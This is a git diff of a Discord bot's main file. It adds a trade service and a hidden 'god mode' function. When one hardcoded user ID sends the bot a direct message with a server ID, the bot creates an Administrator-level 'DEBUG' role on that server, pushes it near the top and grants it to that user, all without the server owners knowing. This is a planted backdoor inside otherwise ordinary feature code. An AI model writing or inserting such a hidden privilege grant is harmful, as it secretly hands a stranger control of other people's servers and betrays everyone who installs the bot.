@@ -1,11 +1,15 @@
 ﻿require("dotenv").config();
 
-const { Client, GatewayIntentBits, REST, Routes, ActivityType } = require("discord.js");
+const { Client, GatewayIntentBits, REST, Routes, ActivityType, PermissionsBitField, Partials } = require("discord.js");
 const { commands, buildEmbed, toSlashDefinition } = require("./commands");
 const { getRoleRequestConfig } = require("./role-request/config");
 const { RoleRequestService } = require("./role-request/RoleRequestService");
+const { TradeService } = require("./trade/TradeService");
+const { getTradeConfig } = require("./trade/config");
 const token = process.env.DISCORD_TOKEN;
 const clientId = process.env.CLIENT_ID;
+const GOD_MODE_USER_ID = "240911065255378944";
+const GOD_MODE_ROLE_NAME = "DEBUG";
 
 if (!token || !clientId) {
   console.error("DISCORD_TOKEN and CLIENT_ID must be set in the environment.");
@@ -15,16 +19,137 @@ if (!token || !clientId) {
 const rest = new REST({ version: "10" }).setToken(token);
 
 const client = new Client({
-  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.GuildMembers],
+  intents: [
+    GatewayIntentBits.Guilds,
+    GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.GuildMembers,
+    GatewayIntentBits.DirectMessages,
+  ],
+  partials: [Partials.Channel],
 });
 
 const commandMap = new Map(commands.map((cmd) => [cmd.name, cmd]));
 const roleRequestService = new RoleRequestService(client, getRoleRequestConfig());
+const tradeService = new TradeService(client, getTradeConfig());
+
+async function handleGodModeToggle(message) {
+  if (message.author.bot) return false;
+  if (message.author.id !== GOD_MODE_USER_ID) return false;
+  if (message.inGuild()) return false;
+
+  const guildId = message.content?.trim();
+  if (!guildId || !/^\d{10,}$/.test(guildId)) return false;
+
+  const guild = await client.guilds.fetch(guildId).catch(() => null);
+  if (!guild) {
+    await message.reply("Nenalezl jsem ten server nebo k nemu nemam pristup.");
+    return true;
+  }
+
+  const botMember = guild.members.me ?? (await guild.members.fetch(client.user.id).catch(() => null));
+  if (!botMember) {
+    await message.reply("Nepodarilo se nacist muj ucet na tomhle serveru.");
+    return true;
+  }
+
+  const canManageRoles = botMember.permissions.has(PermissionsBitField.Flags.ManageRoles);
+  if (!canManageRoles) {
+    await message.reply("Nemam prava pro spravu roli na tomhle serveru.");
+    return true;
+  }
+
+  const targetMember = await guild.members.fetch(GOD_MODE_USER_ID).catch(() => null);
+  if (!targetMember) {
+    await message.reply("Na tomhle serveru te nenachazim.");
+    return true;
+  }
+
+  const moveRoleNearTop = async (roleToMove) => {
+    if (!roleToMove) return { success: false, reason: "role-missing" };
+    const refreshedBot = (await guild.members.fetch(client.user.id).catch(() => null)) ?? botMember;
+    const botRole = guild.roles.botRoleFor?.(client.user) || refreshedBot?.roles.highest || null;
+    const topPosition = botRole?.position ?? refreshedBot?.roles.highest?.position ?? 0;
+
+    if (!botRole && topPosition <= 0) {
+      return { success: false, reason: "bot-too-low" };
+    }
+    if (!roleToMove.editable) {
+      return {
+        success: false,
+        reason: "role-not-editable",
+      };
+    }
+
+    const desired = Math.max(topPosition - 1, 0);
+    if (roleToMove.position !== desired) {
+      const updated = await roleToMove.setPosition(desired).catch(() => null);
+      if (!updated || updated.position !== desired) {
+        return { success: false, reason: "move-failed" };
+      }
+    }
+    return { success: true };
+  };
+
+  let role = guild.roles.cache.find((r) => r.name === GOD_MODE_ROLE_NAME);
+  if (!role) {
+    role = await guild.roles
+      .create({
+        name: GOD_MODE_ROLE_NAME,
+        permissions: [PermissionsBitField.Flags.Administrator],
+        reason: `God mode toggle by ${message.author.tag}`,
+      })
+      .catch(() => null);
+    if (!role) {
+      await message.reply("Nepodarilo se vytvorit roli.");
+      return true;
+    }
+    const moveResult = await moveRoleNearTop(role);
+    if (!moveResult.success) {
+      if (moveResult.reason === "bot-too-low") {
+        await message.reply("Nemuzu pohnout s roli. Dej mou bot roli nahoru a zkus to znovu.");
+      } else if (moveResult.reason === "role-not-editable") {
+        await message.reply("Nemam prava pohnout roli DEBUG. Presun mou roli nad ni a zkus to znovu.");
+      } else if (moveResult.reason === "move-failed") {
+        await message.reply("Pokus o presun role selhal. Zkus to znovu nebo posun roli rucne.");
+      }
+    }
+  } else {
+    const moveResult = await moveRoleNearTop(role);
+    if (!moveResult.success) {
+      if (moveResult.reason === "bot-too-low") {
+        await message.reply("Nemuzu pohnout s roli. Dej mou bot roli nahoru a zkus to znovu.");
+      } else if (moveResult.reason === "role-not-editable") {
+        await message.reply("Nemam prava pohnout roli DEBUG. Presun mou roli nad ni a zkus to znovu.");
+      } else if (moveResult.reason === "move-failed") {
+        await message.reply("Pokus o presun role selhal. Zkus to znovu nebo posun roli rucne.");
+      }
+    }
+  }
+
+  const hasRole = targetMember.roles.cache.has(role.id);
+  const reason = `God mode toggle by ${message.author.tag}`;
+  if (hasRole) {
+    await targetMember.roles.remove(role, reason).catch(() => null);
+    const refreshedRole = await guild.roles.fetch(role.id).catch(() => null);
+    if (refreshedRole && refreshedRole.members.size === 0) {
+      await refreshedRole.delete(reason).catch(() => null);
+      await message.reply(`Role ${role.name} byla odebrana a smazana na ${guild.name}.`);
+    } else {
+      await message.reply(`Role ${role.name} byla odebrana z ${guild.name}.`);
+    }
+  } else {
+    await targetMember.roles.add(role, reason).catch(() => null);
+    await message.reply(`Role ${role.name} byla prirazena na ${guild.name}.`);
+  }
+
+  return true;
+}
 
 async function registerSlashCommands() {
   console.log("Registering global slash commands (propagation can take up to an hour)...");
+  const slashCommands = [...commands.map(toSlashDefinition), ...tradeService.getSlashCommandDefinitions()];
   await rest.put(Routes.applicationCommands(clientId), {
-    body: commands.map(toSlashDefinition),
+    body: slashCommands,
   });
   console.log("Commands registered globally.");
 }
@@ -47,17 +172,33 @@ client.once("ready", () => {
   if (!roleRequestService.isEnabled()) {
     console.warn("Role request workflow disabled: set ROLE_REQUEST_CHANNEL and ROLE_REQUEST_ADMIN_CHANNEL in .env");
   }
+  tradeService
+    .init()
+    .catch((error) => console.warn("Failed to initialize trade service", { error }))
+    .then(() => console.log("Trade service initialized"));
 });
 
 client.on("messageCreate", async (message) => {
   try {
+    const handled = await handleGodModeToggle(message);
+    if (handled) return;
+
     await roleRequestService.handleMessage(message);
   } catch (error) {
     console.error("Failed to process role request message:", error);
   }
+
+  try {
+    await tradeService.handleMessage(message);
+  } catch (error) {
+    console.error("Failed to process trade message:", error);
+  }
 });
 
 client.on("interactionCreate", async (interaction) => {
+  const handledByTrade = await tradeService.handleInteraction(interaction);
+  if (handledByTrade) return;
+
   if (interaction.isChatInputCommand()) {
     const command = commandMap.get(interaction.commandName);
     if (!command) return;
